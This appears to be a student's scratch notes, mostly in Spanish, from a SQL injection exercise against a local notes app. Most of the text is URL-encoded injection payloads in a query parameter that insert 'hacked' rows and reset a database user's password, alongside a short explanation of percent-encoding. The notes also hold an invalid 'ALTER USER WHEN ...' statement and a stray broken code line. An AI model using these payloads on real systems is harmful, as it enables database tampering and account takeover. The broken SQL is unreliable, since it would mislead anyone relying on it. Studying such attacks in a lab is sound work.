http://localhost:8000/notas/?get_prioridad=baja%27%3B%20insert%20into%20Nota%20Values%20(%27hacked%27,%27hacked%27,%27hacked%27)%3B%20COMMIT%20%3B--

ALTER USER capitulo_6_user WITH PASSWORD '1234'

http://localhost:8000/notas/?get_prioridad=baja%27%3B%20ALTER%20USER%20capitulo%5F7%5Fuser%20WITH%20PASSWORD%20%271234%27%3B%20COMMIT%20%3B--



volviendo a constraseña patata:
http://localhost:8000/notas/?get_prioridad=baja%27%3B%20ALTER%20USER%20capitulo%5F7%5Fuser%20WITH%20PASSWORD%20%27patata%27%3B%20COMMIT%20%3B--

/* -- OBSERVACIONES:
Existen códigos de escape para estas situaciones,
un código de escape es una forma de codificar uno de estos caracteres reservados.
En el caso de las urls si escribimos % y un numero en hexadecimal
lo que escribiremos es el simbolo que corresponda en la tabla ascii en nuestro caso.
Debemos escribir %3B pora enviar un ;.
*/

ALTER USER capitulo_6_user WITH PASSWORD '1234';    COMMIT;
'%_%'


-- Crea un sql injection que cambie la contraseña del usuario sin saber el nombre del usuario.
-- PARA OBTENER UNA LISTA DE USUARIOS
SELECT * FROM users WHERE id = 10 or 1=1;
-- CAMBIARIA TODOS LOS USUARIOS
ALTER USER WHEN USER LIKE '%_%' WITH PASSWORD '1234';

-- Otras formas:
SELECT * FROM users WHERE id = 10 or 1=1;



-- Referencias:
https://diego.com.es/ataques-sql-injection-en-php



var1 = def print()

